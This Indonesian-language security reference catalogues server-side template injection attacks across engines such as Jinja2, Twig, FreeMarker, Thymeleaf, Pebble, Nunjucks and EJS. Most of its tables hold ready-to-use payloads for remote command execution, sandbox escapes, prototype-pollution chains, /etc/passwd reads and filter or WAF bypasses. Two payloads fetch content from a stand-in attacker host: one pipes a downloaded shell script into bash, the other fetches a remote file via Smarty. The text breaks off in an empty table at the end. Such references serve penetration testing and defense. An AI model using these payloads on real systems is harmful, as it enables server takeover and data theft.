---
title: Server Side Template Injection
description: 

---

# Taxonomi Mutasi/Variasi Server-Side Template Injection (SSTI)

> **Scope**: Semua template engine **tidak termasuk** EL (Expression Language), OGNL, dan SpEL (Spring Expression Language).
> Mencakup: Jinja2, Twig, FreeMarker, Velocity, Pebble, Thymeleaf, Smarty, Mako, Tornado, ERB, Slim, Razor, Blade, EJS, Handlebars, Nunjucks, Pug, Dust, Go text/template, dan lainnya di seluruh 8 bahasa pemrograman.

---

## Struktur Klasifikasi

Taxonomi ini mengorganisir permukaan serangan SSTI sepanjang tiga sumbu ortogonal:

**Sumbu 1 — Exploitation Mechanism** (Sumbu utama, menyusun dokumen): Teknik fundamental di mana attacker meng-escalate dari template syntax injection ke code execution. Sumbu ini menjawab *bagaimana* design template engine atau host language dimanfaatkan untuk mengeksekusi arbitrary code. Kategori berkisar dari direct host-language execution hingga complex multi-step chain yang melibatkan object introspection, sandbox escape, dan compilation-phase pollution.

**Sumbu 2 — Filter/Restriction Bypass Technique** (Sumbu lintas): Metode evasion yang digunakan untuk mengelak character filter, WAF rule, sandbox policy, atau defense berbasis denylist. Teknik-teknik ini berlaku di multiple kategori Sumbu 1 dan merupakan pembeda utama antara payload "yang diketahui" dan "yang novel". Single exploitation mechanism dapat di-deliver melalui puluhan different bypass variation.

**Sumbu 3 — Deployment Context** (Sumbu pemetaan): Lingkungan arsitektural di mana template engine beroperasi — unsandboxed, sandboxed, framework-integrated, atau client-side — yang menentukan required exploitation chain depth dan available attack surface.

### Ringkasan Sumbu 2: Tipe Filter/Restriction Bypass

| Tipe Bypass | Mekanisme | Engine yang Berlaku |
|---|---|---|
| **Character Encoding** | Hex (`\x5f`), Unicode, URL-encoding dari karakter yang dibatasi | Jinja2, FreeMarker, Twig |
| **Alternative Accessor** | `|attr()`, bracket notation, `getlist()`, `|first` | Jinja2, Twig |
| **String Construction** | `|join`, `~` concatenation, `chr()`, `?lower_abc` | Jinja2, Twig, Smarty, FreeMarker |
| **Parameter Smuggling** | `request.args`, `request.headers`, `request.cookies` | Jinja2 (Flask) |
| **Format String Injection** | `%c`, `format()`, string formatting dari external input | Jinja2, Python engine |
| **Reflection & Indirect Access** | `MethodUtils`, `forName()`, field `TYPE` | Thymeleaf, Pebble, FreeMarker |
| **Template Block Abuse** | `{% with %}`, `{%block%}`, `{%set%}` untuk merestrukturisasi evaluation | Jinja2, Twig |
| **Base64/Nested Encoding** | Multi-layer encoding untuk menghindari detection berbasis signature | Cross-engine (WAF bypass) |

### Ringkasan Sumbu 3: Tipe Deployment Context

| Context | Karakteristik | Chain Depth | Contoh |
|---|---|---|---|
| **Unsandboxed** | Tidak ada pembatasan pada code execution | 1 step | ERB, Mako, Blade, Razor, Smarty `{php}` |
| **Sandboxed** | Denylist/allowlist pada class, method, atau built-in | 2–4 steps | Jinja2 sandbox, FreeMarker `ALLOWS_NOTHING_RESOLVER`, Twig sandbox |
| **Framework-Integrated** | Engine berjalan dalam web framework yang mengekspos context object | Variabel | Flask+Jinja2, Spring+Thymeleaf, Express+EJS |
| **Client-Side (CSTI)** | Template diproses dalam browser; mengarah ke XSS, bukan RCE | 1–2 steps | AngularJS, Vue.js client-side rendering |

---

## §1. Direct Host-Language Execution

Template engine yang mengizinkan direct embedding dari host-language code dalam template delimiter menyediakan path paling sederhana ke code execution. Tidak ada object traversal atau sandbox escape yang diperlukan — template syntax itu sendiri mencakup construct yang mengevaluasi arbitrary code dalam runtime server.

### §1-1. Inline Code Block Execution

Engine-engine ini menyediakan delimiter eksplisit untuk embedding dan mengeksekusi raw code dalam template.

| Subtype | Engine (Bahasa) | Mekanisme | Contoh Payload |
|---|---|---|---|
| **Ruby code blocks** | ERB (Ruby) | Delimiter `<%= %>` dan `<% %>` mengeksekusi arbitrary Ruby | `<%= system('id') %>` |
| **Ruby Slim blocks** | Slim (Ruby) | Prefix `- ` untuk Ruby code, `= ` untuk output | `= system('id')` |
| **PHP code blocks** | Smarty < 3 (PHP) | Tag `{php}...{/php}` mengeksekusi PHP secara langsung | `{php}echo system('id');{/php}` |
| **PHP Blade directives** | Blade (PHP/Laravel) | Directive pair `@php...@endphp` | `@php echo system('id'); @endphp` |
| **C# Razor blocks** | Razor (.NET) | Sintaks `@{ }` dan `@expression` mengeksekusi C# code | `@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }` |
| **Python embedded blocks** | Mako (Python) | Block `<% %>` mengeksekusi Python secara langsung | `<% import os; os.system('id') %>` |
| **Python expression tags** | Mako (Python) | `${expression}` mengevaluasi Python expression | `${__import__('os').popen('id').read()}` |
| **Perl code blocks** | Mojolicious (Perl) | `<%= %>` dan `<% %>` mengeksekusi Perl code | ``<%= `id` %>`` |

Inline code block execution adalah primitive SSTI paling straightforward. Jika template engine mendukungnya dan tidak ada sandbox yang diterapkan, payload attacker dibatasi hanya oleh kemampuan host language runtime. Defense utama adalah untuk tidak pernah mengizinkan input untrusted memasuki template source code.

### §1-2. Module/Import Directive Execution

Beberapa engine mengizinkan importing module atau package dalam template code, mengaktifkan akses ke system-level function bahkan ketika direct code execution delimiter tampak dibatasi.

| Subtype | Engine (Bahasa) | Mekanisme | Contoh Payload |
|---|---|---|---|
| **Python import in template** | Tornado (Python) | `{% import module %}` dalam template block | `{% import os %}{{ os.popen('id').read() }}` |
| **Mako module import** | Mako (Python) | `<%! %>` untuk module-level block, `<% %>` untuk in-line | `<% import subprocess; x=subprocess.check_output('id',shell=True) %>${x}` |
| **Jinja2 namespace import** | Jinja2 (Python) | Ketika extension seperti `jinja2.ext.do` di-load | `{% set x = cycler.__init__.__globals__.os.popen('id').read() %}` |

### §1-3. File Operation Primitive

Beberapa engine menyediakan direct file I/O function dalam template syntax, mengaktifkan arbitrary file read/write tanpa full code execution.

| Subtype | Engine (Bahasa) | Mekanisme | Contoh Payload |
|---|---|---|---|
| **Smarty file write** | Smarty (PHP) | Static method `Smarty_Internal_Write_File::writeFile()` | Menulis PHP webshell ke webroot |
| **ERB file read** | ERB (Ruby) | `File.read()` Ruby dalam `<%= %>` | `<%= File.read('/etc/passwd') %>` |
| **Go method-based file read** | Go text/template | Memanggil exported method pada struct yang di-pass | `{{ .GetFile "/etc/passwd" }}` |

---

## §2. Object Introspection & Class Hierarchy Traversal

Ketika direct code execution tidak tersedia, attacker mengeksploitasi object model host language untuk berjalan inheritance hierarchy, menemukan loaded class, dan mencapai dangerous method. Ini adalah kategori exploitation SSTI paling umum dan serbaguna, mencakup 16 dari 34 template engine yang dipelajari.

### §2-1. Python MRO (Method Resolution Order) Chain

Kemampuan introspection Python yang kaya menjadikannya ground paling subur untuk serangan object-hierarchy SSTI. Teknik fundamental menggunakan `__mro__` atau `mro()` untuk naik inheritance tree ke `object`, kemudian `__subclasses__()` untuk turun dan enumerate semua class yang di-load dalam current Python process.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|---|
| **Basic MRO traversal** | `''.__class__.__mro__[1].__subclasses__()` enumerate semua loaded class | Python object apa pun dalam template context | `{{ ''.__class__.__mro__[1].__subclasses__() }}` |
| **Popen discovery** | Iterate subclass untuk menemukan `subprocess.Popen` pada index spesifik | Module `subprocess` di-load | `{{ ''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate() }}` |
| **FileIO discovery** | Temukan subclass `_io.FileIO` atau `_io._RawIOBase` untuk file read | Module `_io` di-load | `{{ ''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read() }}` |
| **Config object traversal** | Akses `__init__.__globals__` dari object Flask `config` untuk module `os` | Flask application context | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` |
| **Cycler/Joiner globals** | Gunakan `__init__.__globals__` dari object Jinja2 built-in untuk mencapai `os` | Object Jinja2 built-in tersedia | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| **Lipsum globals** | Abuse chain globals dari function Jinja2 `lipsum` | `lipsum` tersedia dalam context | `{{ lipsum.__globals__['os'].popen('id').read() }}` |
| **Namespace traversal** | Gunakan `namespace.__init__.__globals__` | Object Jinja2 namespace tersedia | `{{ namespace.__init__.__globals__.os.popen('id').read() }}` |

Insight kunci adalah bahwa **Python object apa pun** yang reachable dari template context dapat berfungsi sebagai starting point untuk MRO traversal. Tantangan attacker adalah menemukan index yang benar dalam `__subclasses__()` untuk target class, yang bervariasi antar aplikasi dan versi Python. Automated tool menyelesaikan ini dengan mengiterasi semua subclass.

### §2-2. JavaScript Constructor Chain

Dalam JavaScript template engine (Node.js), eksploitasi mencerminkan MRO Python tetapi menggunakan prototype chain dan properti `constructor`. Karena `constructor` dari setiap function menunjuk ke `Function`, attacker dapat membuat arbitrary function dari string body.

| Subtype | Engine | Mekanisme | Contoh |
|---|---|---|---|
| **Range constructor** | Nunjucks | `range.constructor` adalah `Function`, mengizinkan code eval dari string | `{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
| **Cycler constructor** | Nunjucks | Alternatif untuk range; akses `Function` constructor yang sama | `{{ cycler.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}` |
| **String constructor chain** | Handlebars, Pug, EJS, JsRender | `''.constructor.constructor` menghasilkan `Function` | `${ ''.toString.constructor.call({},"return global.process.mainModule.require('child_process').execSync('id')")() }` |
| **Nested helper abuse** | Handlebars | Chain helper `#with`, `split`, `push`, `pop` untuk membangun code execution | `{{#with "s" as \|string\|}}{{#with "e"}}{{#with split as \|conslist\|}}...{{/with}}{{/with}}{{/with}}` |
| **Template7 js helper** | Template7 | Helper built-in `js` mengevaluasi JavaScript | `{{js "global.process.mainModule.require('child_process').execSync('id')"}}` |
| **Marko out expression** | Marko | `${expression}` mengevaluasi arbitrary JS | `${require('child_process').execSync('id')}` |

### §2-3. Java Reflection Chain

Java template engine dieksploitasi melalui reflection — mengakses `getClass()`, kemudian `forName()` untuk mencapai `java.lang.Runtime` atau `java.lang.ProcessBuilder` untuk command execution.

| Subtype | Engine | Mekanisme | Contoh |
|---|---|---|
| **Direct getClass chain** | Pebble (< 3.0.9) | Traversal `variable.getClass().forName(...)` | `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}` |
| **TYPE field bypass** | Pebble (>= 3.0.9) | Field wrapper Java `TYPE` (`(1).TYPE`) menyediakan `Class` tanpa `getClass()` | Via `java.lang.Integer.TYPE` → akses `Class` |
| **Velocity ClassTool** | Velocity | `$class.inspect()` dan `$class.type` memperoleh arbitrary class reference | `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")` |
| **Jinjava reflection** | Jinjava | Python-like introspection yang diadaptasi ke object model Java | Introspective chain mirip Python |
| **Spring bean access** | Pebble + Spring | Exposed Spring bean menyediakan object graph yang mengarah ke unrestricted API | Bean traversal → ClassLoader → arbitrary class instantiation |

---

## §3. Dangerous Built-in Functions & Type Constructors

Banyak template engine menyediakan built-in function atau type-creation mechanism yang dirancang untuk operasi template yang legitimate tetapi dapat di-weaponize untuk code execution.

### §3-1. FreeMarker Built-in Exploitation

FreeMarker menyediakan beberapa built-in function yang mengaktifkan code execution ketika tidak properly restricted.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|---|
| **`?new` instantiation** | Membuat instance dari implementasi `TemplateModel`, termasuk `freemarker.template.utility.Execute` | `TemplateClassResolver` tidak diatur ke `ALLOWS_NOTHING_RESOLVER` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| **`?api` Java API access** | Mengekspos underlying Java API dari BeanWrappers, mengaktifkan reflection | `setAPIBuiltinEnabled(true)` dalam konfigurasi | Akses ke `java.lang.Class`, `ClassLoader`, dan arbitrary method invocation |
| **`?lower_abc` / `?upper_abc` character encoding** | Mengkonversi angka ke karakter alphabet, mengaktifkan filter bypass | FreeMarker expression context | `6?lower_abc` → `"f"`, mengaktifkan character-by-character payload construction |
| **`ObjectConstructor` instantiation** | Direct object creation via built-in `ObjectConstructor` | `UNRESTRICTED_RESOLVER` atau `SAFER_RESOLVER` tidak memblokirnya | `<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}` |
| **`JythonRuntime` execution** | Mengeksekusi kode Jython (Python-on-JVM) dalam FreeMarker | Jython tersedia di classpath, resolver tidak memblokir | `<#assign jr="freemarker.template.utility.JythonRuntime"?new()><@jr>import os; os.system("id")</@jr>` |
| **`assign` + `include` chain** | Assign data model variables kemudian include attacker-controlled resource | Template directive injection | `<#assign x="freemarker.template.utility.Execute"?new()>${x("curl attacker.com/shell.sh \| bash")}` |

### §3-2. Twig Built-in Exploitation

Twig (PHP) menyediakan environment default yang lebih restricted, tetapi beberapa built-in feature dapat di-chain untuk code execution.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|---|
| **`_self` environment access** | `_self.env` mengakses object Twig Environment, mengaktifkan method call | Twig < 2.x (deprecated dalam versi later) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
| **`filter()` callback registration** | Register arbitrary PHP function sebagai Twig filter callback | Akses ke environment object atau `getFilter()` | Register `system` sebagai callback, kemudian panggil via filter |
| **Block/charset gadget** | Abuse `{%block%}` dan `_charset` built-in untuk command construction | Twig rendering context | `{%block U%}id000passthru{%endblock%}{%set x=block(_charset\|first)\|split(000)%}{{ [x\|first]\|map(x\|last)\|join }}` |
| **`_context` variable abuse** | `_context` menyediakan akses ke semua template variable; dikombinasikan dengan `slice`, `split`, `map` untuk code construction | Double-rendering atau akses ke `_context` | `{{ id~passthru~_context\|join\|slice(2,2)\|split(000)\|map(_context\|join\|slice(5,8)) }}` |
| **`sort` / `map` filter with callback** | Array filter Twig menerima callable argument | PHP function accessible | `{{ ['id']\|sort('system') }}` atau `{{ ['id']\|map('system') }}` |
| **`evaluate_twig()` nested call** | Bypass regex-based sanitization via nested Twig evaluation | Grav CMS atau framework serupa yang mengekspos `evaluate_twig` | Nested calls menghindari validasi `cleanDangerousTwig` |

### §3-3. Smarty Built-in Exploitation

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **`{if}` tag code execution** | `{if}` Smarty mengevaluasi PHP expression | Smarty security policy tidak membatasi `{if}` | `{if system('id')}{/if}` |
| **Static class access** | `Smarty_Internal_Write_File` dan static class lainnya accessible | Static class tidak dibatasi | File write untuk membuat webshell |
| **`chr()` + `cat` construction** | `chr()` menghasilkan karakter, modifier `cat` menggabungkan | Akses Smarty function | `{chr(105)\|cat:chr(100)}` → `"id"` → pass ke `passthru()` |
| **`{fetch}` URL access** | Fetch remote content via built-in function `{fetch}` | `{fetch}` tidak dinonaktifkan dalam security policy | `{fetch file="http://attacker.com/shell.txt"}` |

### §3-4. Go Template Method Invocation

Go template engine menyajikan model eksploitasi yang unik: tidak ada intrinsic dangerous function, tetapi **exported method** apa pun pada object yang di-pass ke template dapat dipanggil.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **Exposed method call** | Panggil public method pada struct yang di-pass ke `Execute()` | Target struct memiliki method dengan dangerous side effects | `{{ .ExecuteCmd "id" }}` atau `{{ .GetFile "/etc/passwd" }}` |
| **Method confusion** | Eksploitasi method name collision atau unexpected method accessibility dalam deep object graph | Complex struct hierarchies di-pass ke template | Enumerate accessible method via `{{ . }}` |
| **`call` built-in (text/template)** | Function `call` dari `text/template` meng-invoke function value apa pun | Field function-type dalam template data | `{{ call .DangerousFunc "arg" }}` |

---

## §4. Sandbox Escape Techniques

Ketika template engine mengimplementasikan security sandbox, attacker harus menemukan indirect path ke code execution. Sandbox escape merepresentasikan serangan SSTI paling technically sophisticated dan seringkali engine- atau application-specific.

### §4-1. FreeMarker Sandbox Bypass

Sandbox FreeMarker dikontrol oleh konfigurasi `TemplateClassResolver`. Bahkan dengan `ALLOWS_NOTHING_RESOLVER`, beberapa jalur bypass ada.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **`?api` + ClassLoader chain** | Built-in `?api` mengakses Java API; `getProtectionDomain().getClassLoader()` memperoleh ClassLoader | `setAPIBuiltinEnabled(true)` dan FreeMarker < 2.3.30 | ClassLoader → load arbitrary class → instantiate `Execute` |
| **`getResourceAsStream` file read** | `getResourceAsStream()` dari ClassLoader membaca classpath dan filesystem resource | ClassLoader accessible via `?api` | Read via scheme URI `file://`, `http://`, `ftp://` (SSRF) |
| **Application utility class abuse** | Manfaatkan application-specific class yang diekspos ke template (misalnya, `GroovyUtil.eval()` dari OFBiz) | Aplikasi mengekspos utility class via hash `Static` | `${Static["org.apache.ofbiz.base.util.GroovyUtil"].eval("['id'].execute().text")}` (CVE-2024-48962) |
| **Gson deserialization gadget** | Gunakan `fromJson()` dari Gson untuk deserialize `freemarker.template.utility.Execute` dari JSON | Gson di classpath, ClassLoader accessible | Load Gson → `fromJson()` → instantiate `Execute` → RCE |
| **Version-specific bypasses** | FreeMarker < 2.3.30: `ProtectionDomain.getClassLoader` unrestricted | Versi FreeMarker spesifik | Direct ClassLoader access tanpa `?api` |

### §4-2. Twig Sandbox Bypass

Sandbox Twig membatasi allowed tag, filter, method, dan property melalui `SecurityPolicy`. Bypass menargetkan gap antara policy enforcement dan object yang accessible dalam template context.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **Runtime configuration modification** | Modifikasi `system.twig.safe_functions` / `safe_filters` via `grav.twig.twig_vars['config']` untuk whitelist dangerous function | Grav CMS dengan editor access (CVE-2024-28116) | Step 1: tambahkan `system` ke safe_functions. Step 2: `{{ system('id') }}` |
| **`_self.env` method calls** | Akses method Twig Environment via referensi `_self` | Twig 1.x (deprecated dalam 2.x) | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
| **Regex sanitization bypass** | Nested call `evaluate_twig()` melewati weak regex-based `cleanDangerousTwig` | Grav CMS (CVE-2025-66294) | Nested Twig directive menghindari single-pass regex |
| **Extension class access** | Akses class Twig extension untuk redefine config variable | Template memiliki akses ke object extension | Redefine variable untuk mengaktifkan dangerous function |

### §4-3. Thymeleaf Sandbox Bypass

Thymeleaf mengimplementasikan defense modern termasuk pembatasan package berbasis denylist (`java.`, `javax.`, `org.springframework.util.`), instantiation blocking, dan pencegahan static class access.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **Preprocessing double evaluation** | Preprocessing `__${expr}__` mengevaluasi content antara double underscore sebelum main expression | Input pengguna direfleksikan dalam preprocessing context | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::x` |
| **Third-party library reflection** | Gunakan `org.apache.commons.lang3.reflect.MethodUtils` (tidak dalam denylist) untuk reflection call | commons-lang3 di classpath (umum dalam Spring Boot) | `MethodUtils.invokeStaticMethod(forName("java.lang.Runtime"), "getRuntime")` → `exec()` |
| **Spring context variable access** | Akses object Spring request/response melalui context variable untuk exfiltrate output | Spring MVC integration | Output via object response tanpa external connection |
| **Denylist gaps** | Library third-party dan application-specific class tidak dicakup oleh default denylist | Library tambahan di classpath | Class utility apa pun dengan kemampuan `exec()` atau `invoke()` |

### §4-4. Pebble Sandbox Bypass

Pebble membatasi akses ke `getClass()` dan method berbahaya lainnya. Bypass memanfaatkan type system Java dan framework integration.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **Case-insensitive method bypass** | Pebble < 3.0.9 memeriksa `getClass` secara case-sensitive | Pebble < 3.0.9 | `{{ variable.GetClass().forName(...) }}` |
| **Java wrapper TYPE field** | `java.lang.Integer.TYPE` (dan serupa) menyediakan object `Class` tanpa `getClass()` | Java wrapper type apa pun yang accessible | `{{ (1).TYPE }}` → `java.lang.Class` → reflection chain |
| **Spring bean object graph** | Traverse exposed Spring bean untuk menemukan object dengan ClassLoader atau akses `exec()` | Spring integration dengan bean yang diekspos ke template | Deep inspection dari bean object graph untuk dangerous method |
| **Module-based forName** | Signature `java.lang.Class.forName(java.lang.Module, java.lang.String)` melewati method restriction | Java 9+ module system | Overload `forName` alternatif tidak dicakup oleh denylist |

### §4-5. Jinja2 Sandbox Escape

`SandboxedEnvironment` dari Jinja2 membatasi attribute access dan method call. Escape mengandalkan mencapai object dari environment yang tidak di-sandbox.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **Explicitly passed objects** | Object yang di-pass ke `render_template()` mungkin memiliki unrestricted method access | Developer me-pass object dengan dangerous method | Abuse method dari application-specific object |
| **`__globals__` via allowed objects** | Bahkan dalam sandbox, jika `__init__.__globals__` chain dari allowed object mencapai `os`, execution mungkin | Sandbox tidak memblokir traversal `__globals__` pada allowed object | `{{ allowed_obj.__init__.__globals__['os'].popen('id').read() }}` |
| **Format string escape** | `format_map()` atau `format()` pada string object untuk mengakses globals | Sandbox mengizinkan string formatting | String format specifiers untuk leak atau access restricted object |

---

## §5. Prototype & Compilation-Phase Pollution

Dalam environment JavaScript (Node.js), template engine dapat dikompromikan bukan melalui direct template syntax injection tetapi dengan mencemari JavaScript object prototype atau template compilation pipeline itu sendiri.

### §5-1. EJS Compilation Pollution

EJS mengkompilasi template menjadi JavaScript function. Prototype pollution dapat menyuntikkan code ke dalam compilation output.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **`outputFunctionName` pollution** | Cemari `Object.prototype.outputFunctionName` dengan JS code; EJS menggabungkannya ke dalam compiled function | Server-side prototype pollution + EJS rendering | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('id');//"}}` |
| **`escapeFunction` pollution** | Cemari `opts.escapeFunction`; ketika `opts.client` truthy, EJS merefleksikannya unsanitized ke dalam compiled code | Prototype pollution + flag `client` | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').exec('id')"}}` |
| **`destructuredLocals` pollution** | Cemari array-like properties untuk menyuntikkan destructuring pattern ke dalam compiled output | Versi EJS dengan dukungan destructured locals | Inject malicious variable names dalam destructuring |
| **`settings.view options` chain** | Express menyediakan default config yang mengalir ke option EJS, menciptakan pollution path | Express + EJS default configuration | Default settings Express membuat aplikasi "vulnerable by default" |

### §5-2. Other Node.js Engine Pollution

| Subtype | Engine | Mekanisme | Contoh |
|---|---|---|
| **Pug options pollution** | Pug | Cemari compiler options untuk menyuntikkan code selama template compilation | `{"__proto__":{"block":{"type":"Text","val":"...child_process..."}}}` |
| **Handlebars helper pollution** | Handlebars | Cemari prototype untuk register malicious helper atau modifikasi compilation | Abuse `__lookupGetter__` dan `__defineGetter__` |
| **`constructor.constructor` chain** | Multiple engine | Bahkan tanpa direct pollution, `constructor.constructor` mencapai `Function` untuk eval | `{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}` |

---

## §6. Preprocessing & Double Evaluation

Beberapa template engine mengimplementasikan multi-phase template processing di mana expression dievaluasi dalam stage. Injecting ke dalam earlier processing phase dapat melewati defense yang diterapkan pada later phase.

### §6-1. Thymeleaf Preprocessing Injection

Preprocessing expression Thymeleaf mengevaluasi content antara marker `__...__` sebelum main expression evaluation pass.

| Subtype | Mekanisme | Kondisi Kunci | Contoh |
|---|---|---|
| **URL parameter preprocessing** | Input pengguna dalam expression URL `@{...}` dengan preprocessing `__${input}__` | Input direfleksikan dalam atribut URL `th:href` atau serupa | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x` |
| **Fragment expression preprocessing** | Input digunakan dalam fragment selector `~{template :: __${input}__}` | Dynamic fragment resolution | Inject expression yang dievaluasi selama preprocessing |
| **Attribute preprocessing** | Input dalam `th:text`, `th:value`, atau atribut lain dengan preprocessing | Double-underscore marker dalam nilai atribut template | `__${expression}__` dievaluasi sebelum outer expression |

### §6-2. Multi-Pass Template Rendering

| Subtype | Engine | Mekanisme | Contoh |
|---|---|---|
| **Twig double render** | Twig | Template output di-proses ulang melalui Twig (misalnya, CMS me-render user content sebagai template) | First pass menyisipkan payload, second pass mengeksekusi |
| **Jinja2 `from_string`** | Jinja2 | Aplikasi menggunakan `Environment.from_string()` pada input pengguna, menciptakan direct template execution | `from_string()` memperlakukan input sebagai template source code |
| **FreeMarker `?interpret`** | FreeMarker | `?interpret` mengevaluasi string sebagai FreeMarker template saat runtime | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` dalam interpreted string |
| **Recursive include/import** | Multiple | Template include template lain yang mengandung user-controlled content | Included template mewarisi full template context |

---

## §7. Detection & Identification Techniques

Identifikasi template engine adalah prasyarat kritis untuk eksploitasi. Engine yang berbeda merespons berbeda terhadap polyglot probe yang sama.

### §7-1. Polyglot-Based Detection

| Subtype | Mekanisme | Contoh Probe |
|---|---|---|
| **Universal error polyglot** | Single string yang memicu error dalam semua 44 template engine major | `<%'${{/#{@}}%>{{` (16 karakter) |
| **Arithmetic evaluation probe** | Expression matematika yang me-render hasil dalam engine yang rentan | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` |
| **String multiplication probe** | Distinguish engine berdasarkan bagaimana mereka menangani string multiplication | `{{7*'7'}}` → Jinja2: `7777777`, Twig: `49` |
| **Non-error polyglots** | Tiga probe yang secara kolektif me-render modified (bukan error) output untuk semua 44 engine | Polyglot dari penelitian Template Injection Table |
| **Error message fingerprinting** | Memicu error message spesifik engine untuk mengidentifikasi engine | Sintaks invalid yang menargetkan parser setiap engine |

### §7-2. Behavioral Fingerprinting

| Subtype | Mekanisme | Sinyal Pembeda |
|---|---|---|
| **Delimiter-based identification** | Test style delimiter yang berbeda: `{{ }}`, `<% %>`, `${ }`, `#{ }`, `{% %}` | Delimiter mana yang menyebabkan evaluation vs. literal output |
| **Built-in object probing** | Probe untuk object spesifik engine: `self`, `_self`, `this`, `request`, `env` | Eksistensi object mengkonfirmasi engine spesifik |
| **Filter/function availability** | Test engine-specific filter: `\|attr`, `?api`, `\|sort`, `\|map` | Eksistensi filter mempersempit identitas engine |
| **Comment syntax testing** | Test comment delimiter: `{# #}`, `<%-- --%>`, `{{!-- --}}` | Perilaku rendering comment |
| **DNS/time-based blind detection** | Gunakan `sleep()`, DNS lookup, atau HTTP callback untuk blind SSTI | Sinyal out-of-band mengkonfirmasi template evaluation |
| **Error-based reflection exfiltration** | Sengaja memicu runtime error yang error message atau stack trace-nya menggabungkan target data — misalnya, memaksa type error dengan menggabungkan secret data dengan tipe yang tidak kompatibel (`{{ secret_var + [] }}`), atau menyebabkan NameError/UndefinedError di mana nama variable itu sendiri membawa content yang di-exfiltrate. Error message yang direfleksikan dalam HTTP response membawa data yang diekstrak tanpa memerlukan channel out-of-band | Template engine mengembalikan verbose error message ke client atau menulisnya ke log yang accessible; expression evaluation dalam error context (penelitian "Blind SSTI" vladko312, 2025) |

---

## §8. Filter & WAF Bypass Techniques (Detailed)

Bagian ini memperluas tipe Axis 2 cross-cutting bypass dengan teknik konkret yang diorganisir berdasarkan tipe restriction.

### §8-1. Character Restriction Bypass

Ketika karakter spesifik difilter (underscore, dot, bracket, quote, dll.), fitur template engine itu sendiri menyediakan alternative access path.

| Karakter yang Dibatasi | Teknik Bypass | Engine | Contoh |
|---|---|---|---|
| `_` (underscore) | Hex encoding `\x5f` | Jinja2 | `request\|attr('\x5f\x5fclass\x5f\x5f')` |
| `_` (underscore) | Parameter smuggling `request.args` | Jinja2 (Flask) | `request\|attr(request.args.x)` dengan `?x=__class__` |
| `.` (dot) | Bracket notation `[]` | Jinja2 | `request['__class__']` |
| `.` (dot) | Filter `\|attr()` | Jinja2 | `request\|attr('__class__')` |
| `[]` (brackets) | Filter `\|attr()` | Jinja2 | `request\|attr('__class__')` |
| `'` dan `"` (quotes) | Komposisi function `chr()` | Smarty | `{chr(105)\|cat:chr(100)}` → `"id"` |
| `'` dan `"` (quotes) | `request.args` | Jinja2 (Flask) | Nilai dari query string tidak memerlukan quote dalam template |
| `'` dan `"` (quotes) | `?lower_abc` number-to-char | FreeMarker | `6?lower_abc` → `"f"` |
| `{{ }}` (delimiters) | Sintaks block `{% %}` | Jinja2 | `{% if condition %}...{% endif %}` untuk blind injection |
| `{{ }}` (delimiters) | Block `{% with %}` | Jinja2 | `{% with a=request['application']['__globals__'] %}{{ a }}{% endwith %}` |
| Keywords (`os`, `system`) | String concatenation | Jinja2 | `['o','s']\|join` atau `request.args` smuggling |
| Keywords | Character building `?lower_abc` | FreeMarker | Build keyword character demi character |
| `__class__` dll. | Filter `\|join` concatenation | Jinja2 | `request\|attr(["__","class","__"]\|join)` |
| Karakter umum | Konstruksi list `getlist()` | Jinja2 (Flask) | `request.args.getlist('x')` untuk membangun list tanpa `[]` |
| Karakter umum | Decoding `query_string` | Jinja2 (Flask) | `request.query_string[2:16].decode()` |

### §8-2. Payload Obfuscation Techniques

| Teknik | Tujuan | Engine/Context | Contoh |
|---|---|---|---|
| **Base64 encoding** | Menghindari WAF rule berbasis signature | Multiple (terutama Java engine) | Nested base64 encoding dari komponen payload |
| **Character concatenation** | Bypass keyword filter | Java engine (Velocity) | `Character.toString(99).concat(Character.toString(97))...` → `"cat"` |
| **ASCII value construction** | Bypass string literal filter | Smarty, FreeMarker | `chr()` / `?lower_abc` character-by-character |
| **Unicode normalization** | Menghindari character-level filter | Multiple | Unicode equivalent dari karakter yang dibatasi |
| **Whitespace manipulation** | Memecah WAF regex pattern | Multiple | Tab, newline, zero-width space antar token |
| **Comment injection** | Memecah keyword signature | Twig, Smarty | `{# comment #}` antara bagian dari sensitive keyword |
| **Variable indirection** | Menghindari sensitive string dalam payload | Jinja2, Twig | Simpan bagian payload dalam variable via `{% set %}` |

### §8-3. Context-Aware Delivery Techniques

| Teknik | Mekanisme | Contoh |
|---|---|---|
